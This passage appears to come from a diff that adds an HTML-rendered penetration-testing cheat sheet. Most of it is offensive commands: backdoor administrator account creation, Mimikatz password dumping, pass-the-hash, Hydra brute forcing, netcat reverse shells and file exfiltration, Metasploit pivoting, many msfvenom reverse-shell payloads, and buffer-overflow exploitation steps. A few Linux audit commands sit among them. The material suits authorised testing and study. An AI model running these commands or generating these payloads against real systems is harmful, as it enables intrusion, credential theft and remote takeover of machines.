+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;net user &lt;span class=&quot;nb&quot;&gt;test &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1234&lt;/span&gt; /add
+net localgroup administrators &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt; /add&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;mimikatz-use&quot;&gt;Mimikatz use&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;git clone https://github.com/gentilkiwi/mimikatz.git
+privilege::debug
+sekurlsa::logonPasswords full&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;passing-the-hash&quot;&gt;Passing the Hash&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;git clone https://github.com/byt3bl33d3r/pth-toolkit
+pth-winexe -U &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; //IP cmd
+
+or
+
+apt-get install freerdp-x11
+xfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;hashcat-password-cracking&quot;&gt;Hashcat password cracking&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;hashcat -m &lt;span class=&quot;m&quot;&gt;400&lt;/span&gt; -a &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; /root/rockyou.txt&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;netcat-examples&quot;&gt;Netcat examples&lt;/h2&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;c:&amp;gt; nc -l -p 31337
+&lt;span class=&quot;c&quot;&gt;#nc 192.168.0.10 31337&lt;/span&gt;
+c:&amp;gt; nc -v -w &lt;span class=&quot;m&quot;&gt;30&lt;/span&gt; -p &lt;span class=&quot;m&quot;&gt;31337&lt;/span&gt; -l &amp;lt; secret.txt
+&lt;span class=&quot;c&quot;&gt;#nc -v -w 2 192.168.0.10 31337 &amp;gt; secret.txt&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;banner-grabbing-with-nc&quot;&gt;Banner grabbing with NC&lt;/h2&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nc 192.168.0.10 80
+GET / HTTP/1.1
+Host: 192.168.0.10
+User-Agent: Mozilla/4.0 
+Referrer: www.example.com
+&amp;lt;enter&amp;gt;
+&amp;lt;enter&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;window-reverse-shell&quot;&gt;Window reverse shell&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;c:&amp;gt;nc -Lp &lt;span class=&quot;m&quot;&gt;31337&lt;/span&gt; -vv -e cmd.exe
+nc 192.168.0.10 31337
+c:&amp;gt;nc example.com &lt;span class=&quot;m&quot;&gt;80&lt;/span&gt; -e cmd.exe
+nc -lp 80
+ 
+nc -lp &lt;span class=&quot;m&quot;&gt;31337&lt;/span&gt; -e /bin/bash
+nc 192.168.0.10 31337
+nc -vv -r&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;random&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; -w&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;wait&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; 192.168.0.10 -z&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;i/o error&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 1-1000&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;find-suidsgid-root-files&quot;&gt;Find SUID\SGID root files&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# Find SUID root files&lt;/span&gt;
+find / -user root -perm -4000 -print
+ 
+&lt;span class=&quot;c&quot;&gt;# Find SGID root files:&lt;/span&gt;
+find / -group root -perm -2000 -print
+ 
+&lt;span class=&quot;c&quot;&gt;# Find SUID and SGID files owned by anyone:&lt;/span&gt;
+find / -perm -4000 -o -perm -2000 -print
+ 
+&lt;span class=&quot;c&quot;&gt;# Find files that are not owned by any user:&lt;/span&gt;
+find / -nouser -print
+ 
+&lt;span class=&quot;c&quot;&gt;# Find files that are not owned by any group:&lt;/span&gt;
+find / -nogroup -print
+ 
+&lt;span class=&quot;c&quot;&gt;# Find symlinks and what they point to:&lt;/span&gt;
+find / -type l -ls&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;python-shell&quot;&gt;Python shell&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;python -c &lt;span class=&quot;s1&quot;&gt;&amp;#39;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#39;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;pythonrubyphp-http-server&quot;&gt;Python\Ruby\PHP HTTP Server&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;python2 -m SimpleHTTPServer
+python3 -m http.server
+ruby -rwebrick -e &lt;span class=&quot;s2&quot;&gt;&amp;quot;WEBrick::HTTPServer.new(:Port =&amp;gt; 8888, :DocumentRoot =&amp;gt; Dir.pwd).start&amp;quot;&lt;/span&gt;
+php -S 0.0.0.0:8888&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;get-pids-of-process&quot;&gt;Get PIDs of process&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;fuser -nv tcp &lt;span class=&quot;m&quot;&gt;80&lt;/span&gt; 
+fuser -k -n tcp 80&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;hydra-rdp-bruteforce&quot;&gt;Hydra rdp Bruteforce&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;hydra -l admin -P /root/Desktop/passwords -S X.X.X.X rdp&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;mount-remote-windows-share&quot;&gt;Mount Remote Windows Share&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;smbmount //X.X.X.X/c&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/mnt/remote/ -o &lt;span class=&quot;nv&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;user,password&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;pass,rw&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;compiling-exploit-in-kali&quot;&gt;Compiling Exploit in Kali&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;gcc -m32 -o output32 hello.c &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;32&lt;/span&gt; bit&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+gcc -m64 -o output hello.c &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;64&lt;/span&gt; bit&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;compiling-windows-exploits-on-kali&quot;&gt;Compiling Windows Exploits on Kali&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download
+wine mingw-get-setup.exe
+&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; mingw32-base
+&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root/.wine/drive_c/windows
+wget http://gojhonny.com/misc/mingw_bin.zip &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; unzip mingw_bin.zip
+&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root/.wine/drive_c/MinGW/bin
+wine gcc -o ability.exe /tmp/exploit.c -lwsock32
+wine ability.exe&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;nasm-commands&quot;&gt;NASM Commands&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nasm -f bin -o payload.bin payload.asm
+nasm -f elf payload.asm&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ld -o payload payload.o&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; objdump -d payload&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;ssh-pivoting&quot;&gt;SSH Pivoting&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;ssh -D 127.0.0.1:1080 -p &lt;span class=&quot;m&quot;&gt;22&lt;/span&gt; user@IP
+Add socks4 127.0.0.1 &lt;span class=&quot;m&quot;&gt;1080&lt;/span&gt; in /etc/proxychains.conf
+proxychains commands target&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;ssh-pivoting-from-one-network-to-another&quot;&gt;SSH Pivoting from One Network to Another&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;ssh -D 127.0.0.1:1080 -p &lt;span class=&quot;m&quot;&gt;22&lt;/span&gt; user1@IP1
+Add socks4 127.0.0.1 &lt;span class=&quot;m&quot;&gt;1080&lt;/span&gt; in /etc/proxychains.conf
+proxychains ssh -D 127.0.0.1:1081 -p &lt;span class=&quot;m&quot;&gt;22&lt;/span&gt; user1@IP2
+Add socks4 127.0.0.1 &lt;span class=&quot;m&quot;&gt;1081&lt;/span&gt; in /etc/proxychains.conf
+proxychains commands target&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;pivoting-using-metasploit&quot;&gt;Pivoting Using metasploit&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;route add IP 255.255.255.0 1
+use auxiliary/server/socks4a
+run
+proxychains msfcli windows/* &lt;span class=&quot;nv&quot;&gt;PAYLOAD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;windows/meterpreter/reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;IP &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;443&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;RHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;IP E&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;exploit-db-search-using-csv-file&quot;&gt;Exploit-DB search using CSV File&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;git clone https://github.com/offensive-security/exploit-database.git
+&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;exploit-database
+./searchsploit –u
+./searchsploit apache 2.2
+./searchsploit &lt;span class=&quot;s2&quot;&gt;&amp;quot;Linux Kernel&amp;quot;&lt;/span&gt;
+
+cat files.csv &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; grep -i linux &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; grep -i kernel &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; grep -i &lt;span class=&quot;nb&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; grep -v dos &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; uniq &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; grep 2.6 &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; egrep &lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;lt;|&amp;lt;=&amp;quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; sort -k3&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;msf-payloads&quot;&gt;MSF Payloads&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;msfvenom -p windows/meterpreter/reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;lt;IP Address&amp;gt; X &amp;gt; system.exe
+msfvenom -p php/meterpreter/reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;lt;IP Address&amp;gt; &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;443&lt;/span&gt; R &amp;gt; exploit.php
+msfvenom -p windows/meterpreter/reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;lt;IP Address&amp;gt; &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;443&lt;/span&gt; -e -a x86 --platform win -f asp -o file.asp
+msfvenom -p windows/meterpreter/reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;lt;IP Address&amp;gt; &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;443&lt;/span&gt; -e x86/shikata_ga_nai -b &lt;span class=&quot;s2&quot;&gt;&amp;quot;\x00&amp;quot;&lt;/span&gt; -a x86 --platform win -f c&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;msf-linux-reverse-meterpreter-binary&quot;&gt;MSF Linux Reverse Meterpreter Binary&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;msfvenom -p linux/x86/meterpreter/reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;lt;IP Address&amp;gt; &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;443&lt;/span&gt; -e -f elf -a x86 --platform linux -o shell&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;msf-reverse-shell-c-shellcode&quot;&gt;MSF Reverse Shell (C Shellcode)&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;msfvenom -p windows/shell_reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;127.0.0.1 &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;443&lt;/span&gt; -b &lt;span class=&quot;s2&quot;&gt;&amp;quot;\x00\x0a\x0d&amp;quot;&lt;/span&gt; -a x86 --platform win -f c&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;msf-reverse-shell-python-script&quot;&gt;MSF Reverse Shell Python Script&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;msfvenom -p cmd/unix/reverse_python &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;127.0.0.1 &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;443&lt;/span&gt; -o shell.py&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;msf-reverse-asp-shell&quot;&gt;MSF Reverse ASP Shell&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;msfvenom -p windows/meterpreter/reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;lt;Your IP Address&amp;gt; &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;lt;Your Port to Connect On&amp;gt; -f asp -a x86 --platform win -o shell.asp&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;msf-reverse-bash-shell&quot;&gt;MSF Reverse Bash Shell&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;msfvenom -p cmd/unix/reverse_bash &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;lt;Your IP Address&amp;gt; &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;lt;Your Port to Connect On&amp;gt; -o shell.sh&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;msf-reverse-php-shell&quot;&gt;MSF Reverse PHP Shell&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;msfvenom -p php/meterpreter_reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;lt;Your IP Address&amp;gt; &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;lt;Your Port to Connect On&amp;gt; -o shell.php
+add &amp;lt;?php at the beginning
+perl -i~ -0777pe&lt;span class=&quot;s1&quot;&gt;&amp;#39;s/^/&amp;lt;?php \n/&amp;#39;&lt;/span&gt; shell.php&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;msf-reverse-win-bin&quot;&gt;MSF Reverse Win Bin&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;msfvenom -p windows/meterpreter/reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;lt;Your IP Address&amp;gt; &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;lt;Your Port to Connect On&amp;gt; -f exe -a x86 --platform win -o shell.exe&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;linux-security-commands&quot;&gt;Linux Security Commands&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# find programs with a set uid bit&lt;/span&gt;
+find / -uid &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt; -perm -4000
+ 
+&lt;span class=&quot;c&quot;&gt;# find things that are world writable&lt;/span&gt;
+find / -perm -o&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;w
+ 
+&lt;span class=&quot;c&quot;&gt;# find names with dots and spaces, there shouldn’t be any&lt;/span&gt;
+find / -name &lt;span class=&quot;s2&quot;&gt;&amp;quot; &amp;quot;&lt;/span&gt; -print
+find / -name &lt;span class=&quot;s2&quot;&gt;&amp;quot;..&amp;quot;&lt;/span&gt; -print
+find / -name &lt;span class=&quot;s2&quot;&gt;&amp;quot;. &amp;quot;&lt;/span&gt; -print
+find / -name &lt;span class=&quot;s2&quot;&gt;&amp;quot; &amp;quot;&lt;/span&gt; -print
+ 
+&lt;span class=&quot;c&quot;&gt;# find files that are not owned by anyone&lt;/span&gt;
+find / -nouser
+ 
+&lt;span class=&quot;c&quot;&gt;# look for files that are unlinked&lt;/span&gt;
+lsof +L1
+ 
+&lt;span class=&quot;c&quot;&gt;# get information about procceses with open ports&lt;/span&gt;
+lsof -i
+
+&lt;span class=&quot;c&quot;&gt;# look for weird things in arp&lt;/span&gt;
+arp -a
+ 
+&lt;span class=&quot;c&quot;&gt;# look at all accounts including AD&lt;/span&gt;
+getent passwd
+ 
+&lt;span class=&quot;c&quot;&gt;# look at all groups and membership including AD&lt;/span&gt;
+getent group
+ 
+&lt;span class=&quot;c&quot;&gt;# list crontabs for all users including AD&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; user in &lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;getent passwd&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt;cut -f1 -d:&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;### Crontabs for $user ####&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; crontab -u &lt;span class=&quot;nv&quot;&gt;$user&lt;/span&gt; -l&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
+ 
+&lt;span class=&quot;c&quot;&gt;# generate random passwords&lt;/span&gt;
+cat /dev/urandom&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; tr -dc ‘a-zA-Z0-9-_!@#&lt;span class=&quot;nv&quot;&gt;$%&lt;/span&gt;^&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt;*&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;_+&lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt;:&amp;lt;&amp;gt;?&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;’&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt;fold -w 12&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; head -n 4
+ 
+&lt;span class=&quot;c&quot;&gt;# find all immutable files, there should not be any&lt;/span&gt;
+find . &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; xargs -I file lsattr -a file 2&amp;gt;/dev/null &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; grep ‘^….i’
+ 
+&lt;span class=&quot;c&quot;&gt;# fix immutable files&lt;/span&gt;
+chattr -i file&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;win-buffer-overflow-exploit-commands&quot;&gt;Win Buffer Overflow Exploit Commands&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;msfvenom -p windows/shell_bind_tcp -a x86 --platform win -b &lt;span class=&quot;s2&quot;&gt;&amp;quot;\x00&amp;quot;&lt;/span&gt; -f c
+msfvenom -p windows/meterpreter/reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;X.X.X.X &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;443&lt;/span&gt; -a x86 --platform win -e x86/shikata_ga_nai -b &lt;span class=&quot;s2&quot;&gt;&amp;quot;\x00&amp;quot;&lt;/span&gt; -f c
+
+COMMONLY USED BAD CHARACTERS:
+&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;0a&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;0d&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;20&lt;/span&gt;                              For http request
+&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;0a&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;0d&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2c&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2e&lt;span class=&quot;se&quot;&gt;\3&lt;/span&gt;a&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;5c           Ending with &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0&lt;span class=&quot;se&quot;&gt;\n\r&lt;/span&gt;_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Useful Commands:&lt;/span&gt;
+pattern create
+pattern offset &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;EIP Address&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+pattern offset &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ESP Address&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+add garbage upto EIP value and add &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;JMP ESP address&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; in EIP . &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;ESP&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; shellcode &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ 
+!pvefindaddr pattern_create 5000
+!pvefindaddr suggest
+!pvefindaddr modules
+!pvefindaddr nosafeseh
+ 
+!mona config -set workingfolder C:&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;ona&lt;span class=&quot;se&quot;&gt;\%&lt;/span&gt;p
+!mona config -get workingfolder
+!mona mod
+!mona bytearray -b &lt;span class=&quot;s2&quot;&gt;&amp;quot;\x00\x0a&amp;quot;&lt;/span&gt;
+!mona pc 5000
+!mona po EIP
+!mona suggest&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;seh---structured-exception-handling&quot;&gt;SEH - Structured Exception Handling&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;https://en.wikipedia.org/wiki/Microsoft-specific_exception_handling_mechanisms#SEH
+!mona suggest
+!mona nosafeseh
